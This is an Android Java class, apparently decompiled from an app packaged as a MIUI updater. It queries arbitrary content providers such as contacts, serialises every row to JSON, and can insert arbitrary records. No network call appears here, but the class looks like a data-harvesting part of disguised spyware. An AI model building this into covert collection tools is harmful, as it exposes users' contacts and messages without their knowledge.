package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeContent {
    Context mContext;

    MeContent(Context c) {
        this.mContext = c;
    }

    public String search(String uri, String ss) throws JSONException {
        return search(uri, ss, null);
    }

    @SuppressLint({"NewApi"})
    public String search(String uri, String ss, String param) throws JSONException {
        Uri myUri = Uri.parse(uri);
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        try {
            Cursor cursor = this.mContext.getContentResolver().query(myUri, null, ss, null, param);
            while (cursor.moveToNext()) {
                JSONObject pnObj = new JSONObject();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (cursor.getType(i) == 3) {
                        pnObj.put(cursor.getColumnName(i), cursor.getString(i));
                    }
                    if (cursor.getType(i) == 1) {
                        pnObj.put(cursor.getColumnName(i), cursor.getInt(i));
                    }
                    if (cursor.getType(i) == 4) {
                        pnObj.put(cursor.getColumnName(i), cursor.getBlob(i));
                    }
                    if (cursor.getType(i) == 2) {
                        pnObj.put(cursor.getColumnName(i), (double) cursor.getFloat(i));
                    }
                }
                jsonArr.put(pnObj);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }

    @SuppressLint({"NewApi"})
    public String getall(String uri) throws JSONException {
        Uri myUri = Uri.parse(uri);
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        try {
            Cursor contacts = this.mContext.getContentResolver().query(myUri, null, null, null, null);
            while (contacts.moveToNext()) {
                JSONObject pnObj = new JSONObject();
                for (int iy = 0; iy < contacts.getColumnCount(); iy++) {
                    if (contacts.getType(iy) == 3) {
                        pnObj.put(contacts.getColumnName(iy), contacts.getString(iy));
                    }
                    if (contacts.getType(iy) == 1) {
                        pnObj.put(contacts.getColumnName(iy), contacts.getInt(iy));
                    }
                    if (contacts.getType(iy) == 4) {
                        pnObj.put(contacts.getColumnName(iy), contacts.getBlob(iy));
                    }
                    if (contacts.getType(iy) == 2) {
                        pnObj.put(contacts.getColumnName(iy), (double) contacts.getFloat(iy));
                    }
                }
                jsonArr.put(pnObj);
            }
            contacts.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }

    public void write(String uri, String[] name, String[] val) {
        ContentValues values = new ContentValues();
        for (int i = 0; i < name.length; i++) {
            values.put(name[i], val[i]);
        }
        try {
            this.mContext.getContentResolver().insert(Uri.parse(uri), values);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
